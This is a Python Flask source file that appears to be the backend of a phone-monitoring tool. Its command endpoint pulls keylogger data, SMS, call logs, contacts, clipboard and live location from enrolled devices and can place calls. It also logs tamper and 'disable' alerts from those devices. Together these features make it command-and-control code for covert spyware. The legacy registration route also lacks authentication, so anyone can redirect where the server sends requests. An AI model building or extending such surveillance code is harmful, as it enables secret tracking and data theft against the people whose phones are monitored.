from flask import Blueprint, request, jsonify, Response
from datetime import datetime
import requests
from sqlalchemy.exc import SQLAlchemyError
from models.devices import Device, DeviceInfo, Keystroke, AppInfo, DeviceLocation, DeviceNotification
from config.database import db
from utils.ownership import require_device_ownership, require_body_ownership, verify_device_access
from utils.jwt_auth import require_auth, require_admin
from logzero import logger

devices_bp = Blueprint('devices', __name__)


def update_device_last_seen(device_id):
    try:
        device = Device.query.get(device_id)
        if device:
            device.last_seen = datetime.now()
            db.session.commit()
    except SQLAlchemyError as e:
        logger.error(f"Error updating last seen for device {device_id}: {str(e)}")
        db.session.rollback()
        raise e


@devices_bp.route('/register-device', methods=['POST'])
def register_device():
    """Legacy registration endpoint — kept for backward compatibility.
    New devices should use /auth/device/register instead."""
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        device_ip = data.get('deviceIp')
        fcm_token = data.get('fcmToken')
        device_name = data.get('deviceName')

        if not device_id or not device_ip:
            return jsonify({'error': 'Missing device ID or IP'}), 400

        device = Device.query.get(device_id)
        if device:
            device.device_ip = device_ip
            device.last_seen = datetime.now()
            device.status = 'online'
            if fcm_token:
                device.fcm_token = fcm_token
            if device_name:
                device.device_name = device_name
        else:
            device = Device(
                device_id=device_id,
                device_ip=device_ip,
                fcm_token=fcm_token,
                device_name=device_name,
                status='online',
            )
            db.session.add(device)

        db.session.commit()

        try:
            msg = f'Device {device_id[:8]} came online ({device_ip})'
            notif = DeviceNotification(device_id=device_id, event_type='device_online', message=msg)
            db.session.add(notif)
            db.session.commit()
        except Exception:
            db.session.rollback()

        try:
            from flask import current_app
            emit_fn = current_app.config.get('EMIT_EVENT')
            if emit_fn:
                emit_fn('device_registered', device.to_dict(), device_id=device_id)
        except Exception:
            pass

        return jsonify({
            'message': 'Device registered successfully',
            'device': device.to_dict(),
        }), 200

    except SQLAlchemyError as e:
        logger.error(f"Error updating device: {str(e)}")
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@devices_bp.route('/device-info', methods=['POST'])
@require_body_ownership
def device_info():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')

        if not device_id:
            return jsonify({'error': 'Missing device ID'}), 400

        device_info = DeviceInfo(
            device_id=device_id,
            info_type='device_info',
            data=str(data)
        )
        db.session.add(device_info)
        db.session.commit()

        update_device_last_seen(device_id)
        return jsonify({'message': 'Device info saved successfully'}), 200

    except SQLAlchemyError as e:
        logger.error(f"Error updating device info: {str(e)}")
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@devices_bp.route('/devices', methods=['GET'])
@require_auth
def get_devices():
    """List devices. Admins see all; users see only their own devices."""
    try:
        from flask import g
        if g.current_user_role == 'admin':
            devices = Device.query.all()
        elif getattr(g, 'token_type', 'user') == 'device':
            # Devices can only see themselves
            devices = Device.query.filter_by(device_id=g.current_user_id).all()
        else:
            # Users see only their own devices
            devices = Device.query.filter_by(user_id=g.current_user_id).all()
        return jsonify([device.to_dict() for device in devices]), 200

    except SQLAlchemyError as e:
        logger.error(f"Error listing devices: {str(e)}")
        return jsonify({'error': str(e)}), 500


@devices_bp.route('/device/<device_id>/info', methods=['GET'])
@require_device_ownership
def get_device_info(device_id):
    try:
        device_info = DeviceInfo.query.filter_by(device_id=device_id)\
            .order_by(DeviceInfo.timestamp.desc()).all()
        return jsonify([info.to_dict() for info in device_info]), 200

    except SQLAlchemyError as e:
        logger.error(f"Error getting device info for device {device_id}: {str(e)}")
        return jsonify({'error': str(e)}), 500


@devices_bp.route('/trigger/<device_id>/<command>', methods=['GET'])
@require_device_ownership
def trigger_device_command(device_id, command):
    try:
        device = Device.query.get(device_id)
        if not device:
            return jsonify({'error': 'Device not found'}), 404

        commands = {
            'battery': '/getBatteryInfo',
            'device': '/getDeviceInfo',
            'sim': '/getSimInfo',
            'clipboard': '/getClipboard',
            'os': '/getOsInfo',
            'contacts': '/getContacts',
            'calllog': '/getCallLogs',
            'makeCall': '/makeCall',
            'getSMS': '/getSMS',
            'location': '/getFreshLocation',
            'keylogger': '/getKeyloggerData',
            'local-keylogger': '/getAllKeyloggerData',
            'appinfo': '/getAppsInfo',
            'get-paths': '/getAvailablePaths',
        }

        if command not in commands:
            return jsonify({'error': 'Invalid command'}), 400

        device_url = f'http://{device.device_ip}:8080{commands[command]}'
        response = requests.get(device_url, timeout=5)

        if response.status_code == 200:
            return jsonify({
                'message': f'Command {command} executed successfully',
                'data': response.json()
            }), 200
        else:
            return jsonify({'error': 'Failed to execute command on device'}), 500

    except requests.exceptions.Timeout:
        return jsonify({'error': 'Device timeout'}), 504
    except requests.exceptions.ConnectionError:
        return jsonify({'error': 'Could not connect to device'}), 503
    except Exception as e:
        logger.error(f"Error triggering command {command} on device {device_id}: {str(e)}")
        return jsonify({'error': str(e)}), 500


@devices_bp.route('/device-event', methods=['POST'])
@require_body_ownership
def device_event():
    """Receive security/tamper events from devices."""
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        event = data.get('event', 'unknown')
        timestamp = data.get('timestamp')

        if not device_id:
            return jsonify({'error': 'Missing deviceId'}), 400

        update_device_last_seen(device_id)

        logger.warning(f"DEVICE EVENT [{device_id}]: {event}")

        from flask import current_app
        emit_event = current_app.config.get('EMIT_EVENT')
        if emit_event:
            emit_event('device_alert', {
                'device_id': device_id,
                'event': event,
                'timestamp': timestamp,
                'severity': 'critical' if 'tamper' in event or 'disable' in event else 'warning'
            })

        try:
            from utils.audit import log_action
            log_action(
                action=f'device_event:{event}',
                target_type='device',
                target_id=device_id,
                details=data
            )
        except Exception:
            pass

        return jsonify({'status': 'received'}), 200

    except Exception as e:
        logger.error(f"Error processing device event: {e}")
        return jsonify({'error': str(e)}), 500
